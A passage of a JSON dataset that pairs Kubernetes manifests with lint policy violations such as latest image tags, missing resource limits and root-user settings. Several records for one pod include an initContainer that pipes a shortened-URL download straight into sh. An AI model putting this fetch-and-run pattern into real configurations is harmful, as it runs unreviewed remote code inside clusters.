-credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"participant-manager-datastore\" has memory limit 0"
  },
  {
    "id": "10317",
    "manifest_path": "data/manifests/the_stack_sample/sample_3974.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod-11\n  labels:\n    app: myapp\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    securityContext:\n      runAsUser: 1000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10318",
    "manifest_path": "data/manifests/the_stack_sample/sample_3974.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod-11\n  labels:\n    app: myapp\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    securityContext:\n      runAsUser: 1000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "10319",
    "manifest_path": "data/manifests/the_stack_sample/sample_3974.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod-11\n  labels:\n    app: myapp\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    securityContext:\n      runAsUser: 1000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "10320",
    "manifest_path": "data/manifests/the_stack_sample/sample_3974.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod-11\n  labels:\n    app: myapp\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    securityContext:\n      runAsUser: 1000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "10321",
    "manifest_path": "data/manifests/the_stack_sample/sample_3975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nats-box\n  labels:\n    app: nats-box\nspec:\n  volumes:\n  - name: syscreds-volume\n    secret:\n      secretName: nats-sys-creds\n  - name: creds-volume\n    secret:\n      secretName: nats-test-creds\n  - name: creds2-volume\n    secret:\n      secretName: nats-test2-creds\n  - name: stan-creds-volume\n    secret:\n      secretName: stan-creds\n  containers:\n  - name: nats-box\n    image: synadia/nats-box:0.2.0\n    imagePullPolicy: Always\n    env:\n    - name: NATS_URL\n      value: nats\n    - name: STAN_CLUSTER\n      value: stan\n    - name: STAN_CREDS\n      value: /var/run/nats/creds/stan/stan.creds\n    - name: USER_CREDS\n      value: /var/run/nats/creds/test/test.creds\n    - name: USER2_CREDS\n      value: /var/run/nats/creds/test2/test.creds\n    command:\n    - tail\n    - -f\n    - /dev/null\n    volumeMounts:\n    - name: syscreds-volume\n      mountPath: /var/run/nats/creds/sys\n    - name: creds-volume\n      mountPath: /var/run/nats/creds/test\n    - name: creds2-volume\n      mountPath: /var/run/nats/creds/test2\n    - name: stan-creds-volume\n      mountPath: /var/run/nats/creds/stan\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nats-box\" does not have a read-only root file system"
  },
  {
    "id": "10322",
    "manifest_path": "data/manifests/the_stack_sample/sample_3975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nats-box\n  labels:\n    app: nats-box\nspec:\n  volumes:\n  - name: syscreds-volume\n    secret:\n      secretName: nats-sys-creds\n  - name: creds-volume\n    secret:\n      secretName: nats-test-creds\n  - name: creds2-volume\n    secret:\n      secretName: nats-test2-creds\n  - name: stan-creds-volume\n    secret:\n      secretName: stan-creds\n  containers:\n  - name: nats-box\n    image: synadia/nats-box:0.2.0\n    imagePullPolicy: Always\n    env:\n    - name: NATS_URL\n      value: nats\n    - name: STAN_CLUSTER\n      value: stan\n    - name: STAN_CREDS\n      value: /var/run/nats/creds/stan/stan.creds\n    - name: USER_CREDS\n      value: /var/run/nats/creds/test/test.creds\n    - name: USER2_CREDS\n      value: /var/run/nats/creds/test2/test.creds\n    command:\n    - tail\n    - -f\n    - /dev/null\n    volumeMounts:\n    - name: syscreds-volume\n      mountPath: /var/run/nats/creds/sys\n    - name: creds-volume\n      mountPath: /var/run/nats/creds/test\n    - name: creds2-volume\n      mountPath: /var/run/nats/creds/test2\n    - name: stan-creds-volume\n      mountPath: /var/run/nats/creds/stan\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nats-box\" is not set to runAsNonRoot"
  },
  {
    "id": "10323",
    "manifest_path": "data/manifests/the_stack_sample/sample_3975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nats-box\n  labels:\n    app: nats-box\nspec:\n  volumes:\n  - name: syscreds-volume\n    secret:\n      secretName: nats-sys-creds\n  - name: creds-volume\n    secret:\n      secretName: nats-test-creds\n  - name: creds2-volume\n    secret:\n      secretName: nats-test2-creds\n  - name: stan-creds-volume\n    secret:\n      secretName: stan-creds\n  containers:\n  - name: nats-box\n    image: synadia/nats-box:0.2.0\n    imagePullPolicy: Always\n    env:\n    - name: NATS_URL\n      value: nats\n    - name: STAN_CLUSTER\n      value: stan\n    - name: STAN_CREDS\n      value: /var/run/nats/creds/stan/stan.creds\n    - name: USER_CREDS\n      value: /var/run/nats/creds/test/test.creds\n    - name: USER2_CREDS\n      value: /var/run/nats/creds/test2/test.creds\n    command:\n    - tail\n    - -f\n    - /dev/null\n    volumeMounts:\n    - name: syscreds-volume\n      mountPath: /var/run/nats/creds/sys\n    - name: creds-volume\n      mountPath: /var/run/nats/creds/test\n    - name: creds2-volume\n      mountPath: /var/run/nats/creds/test2\n    - name: stan-creds-volume\n      mountPath: /var/run/nats/creds/stan\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nats-box\" has cpu request 0"
  },
  {
    "id": "10324",
    "manifest_path": "data/manifests/the_stack_sample/sample_3975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nats-box\n  labels:\n    app: nats-box\nspec:\n  volumes:\n  - name: syscreds-volume\n    secret:\n      secretName: nats-sys-creds\n  - name: creds-volume\n    secret:\n      secretName: nats-test-creds\n  - name: creds2-volume\n    secret:\n      secretName: nats-test2-creds\n  - name: stan-creds-volume\n    secret:\n      secretName: stan-creds\n  containers:\n  - name: nats-box\n    image: synadia/nats-box:0.2.0\n    imagePullPolicy: Always\n    env:\n    - name: NATS_URL\n      value: nats\n    - name: STAN_CLUSTER\n      value: stan\n    - name: STAN_CREDS\n      value: /var/run/nats/creds/stan/stan.creds\n    - name: USER_CREDS\n      value: /var/run/nats/creds/test/test.creds\n    - name: USER2_CREDS\n      value: /var/run/nats/creds/test2/test.creds\n    command:\n    - tail\n    - -f\n    - /dev/null\n    volumeMounts:\n    - name: syscreds-volume\n      mountPath: /var/run/nats/creds/sys\n    - name: creds-volume\n      mountPath: /var/run/nats/creds/test\n    - name: creds2-volume\n      mountPath: /var/run/nats/creds/test2\n    - name: stan-creds-volume\n      mountPath: /var/run/nats/creds/stan\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nats-box\" has memory limit 0"
  },
  {
    "id": "10325",
    "manifest_path": "data/manifests/the_stack_sample/sample_3977.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    service.beta.kubernetes.io/azure-load-balancer-resource-group: shirhattik8sgroup\n  name: azure-load-balancer\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 5000\n  selector:\n    app: dotnet-app\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:dotnet-app])"
  },
  {
    "id": "10326",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"traefik\" does not have a read-only root file system"
  },
  {
    "id": "10327",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"traefik-forward-auth\" does not have a read-only root file system"
  },
  {
    "id": "10328",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"traefik\" not found"
  },
  {
    "id": "10329",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"traefik\" is not set to runAsNonRoot"
  },
  {
    "id": "10330",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"traefik-forward-auth\" is not set to runAsNonRoot"
  },
  {
    "id": "10331",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"traefik\" has cpu request 0"
  },
  {
    "id": "10332",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"traefik-forward-auth\" has cpu request 0"
  },
  {
    "id": "10333",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"traefik\" has memory limit 0"
  },
  {
    "id": "10334",
    "manifest_path": "data/manifests/the_stack_sample/sample_3978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: traefik\n  labels:\n    app: traefik\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik\n      containers:\n      - image: traefik:1.7.12\n        name: traefik\n        args:\n        - --configfile=/config/traefik.toml\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n          protocol: TCP\n        - name: https\n          containerPort: 443\n          hostPort: 443\n          protocol: TCP\n        - name: dash\n          containerPort: 8080\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /config\n          name: configs\n        - mountPath: /acme\n          name: acme\n      - image: thomseddon/traefik-forward-auth:2\n        name: traefik-forward-auth\n        ports:\n        - containerPort: 4181\n          protocol: TCP\n        env:\n        - name: CONFIG\n          value: /config\n        - name: COOKIE_DOMAIN\n          value: example.com\n        - name: DOMAIN\n          value: example.com\n        - name: AUTH_HOST\n          value: auth.example.com\n        - name: LOG_LEVEL\n          value: info\n        - name: PROVIDERS_GOOGLE_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-id\n        - name: PROVIDERS_GOOGLE_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: google-client-secret\n        - name: COOKIE_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: secrets\n              key: cookie-secret\n        volumeMounts:\n        - name: configs\n          mountPath: /config\n          subPath: traefik-forward-auth.ini\n      volumes:\n      - name: configs\n        configMap:\n          name: configs\n      - name: secrets\n        secret:\n          secretName: secrets\n      - name: acme\n        persistentVolumeClaim:\n          claimName: traefik-acme\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"traefik-forward-auth\" has memory limit 0"
  },
  {
    "id": "10335",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hw2-webserver\" is using an invalid container image, \"i2rdevops/hw2-webserver:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10336",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"init\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10337",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hw2-webserver\" does not have a read-only root file system"
  },
  {
    "id": "10338",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "10339",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hw2-webserver\" is not set to runAsNonRoot"
  },
  {
    "id": "10340",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
